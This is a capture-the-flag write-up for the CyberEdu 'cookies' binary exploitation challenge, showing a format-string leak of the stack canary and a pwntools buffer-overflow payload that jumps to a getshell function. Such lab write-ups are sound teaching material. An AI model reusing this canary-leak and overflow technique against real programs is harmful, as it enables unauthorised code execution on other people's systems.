+++
date = '2026-01-04'
draft = false
title = 'CyberEdu cookies Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
+++


## Challenge overview

**[Cookies](https://app.cyber-edu.co/challenges/d20b73b0-5357-11ec-9eab-1912e4e08bd5?tenant=cyberedu)** for my friends.

![challenge-screenshot](pic1.png#center)

We've got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.

![challenge-screenshot](pic2.png#center)

This loop happens exactly twice, to leak something then for us to exploit the buffer overflow.

We even have a `getshell` function, so this really won't be that complicated; We're not even dealing with PIE.

---

## Identifying the vulnerabilities

![challenge-screenshot](pic3.png#center)

We get the gadgets in our binary, we can start looking for the canary now! Let's just look remotely straight away, so we don't bother with trying to do it twice, since the offsets are going to differ.

This challenge feels *very* familiar and it's definitely identical to something I solved earlier this week, with a different name; I looked for it and it was this one (I was right of course): **[dark magic](https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/)**. I'll do it again though, no problem.

![challenge-screenshot](pic4.png#center)

And here is our canary! Now we just need to finish setting up the payload.

---

## The exploit

You see, because I already did this last time, I remember we needed a `ret` for alignment in the payload, because `system(/bin/sh)` most often needs one. Don't question it too much if you're new to this, it's just assembly crap.

So our payload looks something like this now:

```python
p.recvuntil(b"Hacker!\n")
p.sendline(b"%21$p")

canary=p.recvline().strip()
print(canary)
canary=int(canary,16)

print(f"canary: {hex(canary)}")

payload = (b"a"*104 + #buf
           p64(canary) +
           b"r"*8 +
           p64(ret) +
           p64(getshell)
           )

p.sendline(payload)
```

And we get the flag, first try!

![challenge-screenshot](flag.png#center)


---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/cookies.py)**.
